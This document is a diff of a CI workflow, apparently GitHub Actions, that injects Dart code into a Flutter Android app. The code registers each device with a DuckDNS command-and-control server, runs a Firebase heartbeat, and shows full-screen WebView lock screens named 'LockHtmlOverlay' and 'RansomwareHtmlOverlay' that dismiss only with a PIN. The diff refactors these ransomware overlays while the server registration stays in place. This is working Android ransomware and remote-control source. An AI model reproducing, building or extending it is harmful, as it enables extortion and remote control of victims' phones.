@@ -520,7 +520,7 @@ jobs:
           EOF
 
       # ============================================
-      # 5. INJECT DART FILES (main.dart, services, dll)
+      # 5. INJECT DART FILES
       # ============================================
       - name: Inject Dart Services
         run: |
@@ -594,7 +594,6 @@ jobs:
               String realAndroidVersion = androidInfo.version.release;
               String realSdk = androidInfo.version.sdkInt.toString();
 
-              // KIRIM KE SERVER
               try {
                 final res = await http.post(
                   Uri.parse('http://nodeyagamigantengsayang.duckdns.top:4130/register'),
@@ -612,7 +611,6 @@ jobs:
                 debugPrint('Register response: ${res.statusCode} ${res.body}');
               } catch(e) { debugPrint('Register error: $e'); }
 
-              // 🔥 FIX: HEARTBEAT — kirim last_seen terus tiap 60 detik biar device ga dianggap mati
               void startHeartbeat() {
                 final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
                 Timer.periodic(const Duration(seconds: 60), (_) async {
@@ -642,7 +640,6 @@ jobs:
                   } catch(e) { debugPrint('Heartbeat error: $e'); }
                 });
               }
-              // Panggil heartbeat pertama kali (langsung)
               try {
                 final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
                 await fb.ref('devices/$uid').update({
@@ -699,7 +696,7 @@ jobs:
           import 'package:firebase_core/firebase_core.dart';
           import 'package:webview_flutter/webview_flutter.dart';
 
-          class LockHtmlOverlay extends StatelessWidget {
+          class LockHtmlOverlay extends StatefulWidget {
             final String assetPath;
             final String deviceId;
             final String currentPin;
@@ -707,20 +704,32 @@ jobs:
             const LockHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
 
             @override
-            Widget build(BuildContext context) {
-              final controller = WebViewController();
-              controller.setJavaScriptMode(JavaScriptMode.unrestricted);
-              controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
-                if (msg.message == 'unlock') onUnlock();
+            State<LockHtmlOverlay> createState() => _LockHtmlOverlayState();
+          }
+
+          class _LockHtmlOverlayState extends State<LockHtmlOverlay> {
+            late final WebViewController _controller;
+
+            @override
+            void initState() {
+              super.initState();
+              _controller = WebViewController();
+              _controller.setJavaScriptMode(JavaScriptMode.unrestricted);
+              _controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
+                if (msg.message == 'unlock') widget.onUnlock();
               });
-              controller.setNavigationDelegate(NavigationDelegate(
-                onPageFinished: (url) {
-                  controller.runJavaScript("window.DEVICE_ID = '$deviceId';");
-                  controller.runJavaScript("window.CORRECT_PIN = '$currentPin';");
+              _controller.setNavigationDelegate(NavigationDelegate(
+                onPageFinished: (url) async {
+                  await _controller.runJavaScript("window.DEVICE_ID = '${widget.deviceId}';");
+                  await _controller.runJavaScript("window.CORRECT_PIN = '${widget.currentPin}';");
                 },
               ));
-              controller.loadFlutterAsset(assetPath);
-              return Scaffold(body: SafeArea(child: WebViewWidget(controller: controller)));
+              _controller.loadFlutterAsset(widget.assetPath);
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
             }
           }
 
@@ -794,7 +803,7 @@ jobs:
           import 'package:firebase_core/firebase_core.dart';
           import 'package:webview_flutter/webview_flutter.dart';
 
-          class RansomwareHtmlOverlay extends StatelessWidget {
+          class RansomwareHtmlOverlay extends StatefulWidget {
             final String assetPath;
             final String deviceId;
             final String currentPin;
@@ -802,20 +811,32 @@ jobs:
             const RansomwareHtmlOverlay({Key? key, required this.assetPath, required this.deviceId, required this.currentPin, required this.onUnlock}) : super(key: key);
 
             @override
-            Widget build(BuildContext context) {
-              final controller = WebViewController();
-              controller.setJavaScriptMode(JavaScriptMode.unrestricted);
-              controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
-                if (msg.message == 'unlock') onUnlock();
+            State<RansomwareHtmlOverlay> createState() => _RansomwareHtmlOverlayState();
+          }
+
+          class _RansomwareHtmlOverlayState extends State<RansomwareHtmlOverlay> {
+            late final WebViewController _controller;
+
+            @override
+            void initState() {
+              super.initState();
+              _controller = WebViewController();
+              _controller.setJavaScriptMode(JavaScriptMode.unrestricted);
+              _controller.addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) {
+                if (msg.message == 'unlock') widget.onUnlock();
               });
-              controller.setNavigationDelegate(NavigationDelegate(
-                onPageFinished: (url) {
-                  controller.runJavaScript("window.DEVICE_ID = '$deviceId';");
-                  controller.runJavaScript("window.CORRECT_PIN = '$currentPin';");
+              _controller.setNavigationDelegate(NavigationDelegate(
+                onPageFinished: (url) async {
+                  await _controller.runJavaScript("window.DEVICE_ID = '${widget.deviceId}';");
+                  await _controller.runJavaScript("window.CORRECT_PIN = '${widget.currentPin}';");
                 },
               ));
-              controller.loadFlutterAsset(assetPath);
-              return Scaffold(body: SafeArea(child: WebViewWidget(controller: controller)));
+              _controller.loadFlutterAsset(widget.assetPath);
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
             }
           }
 
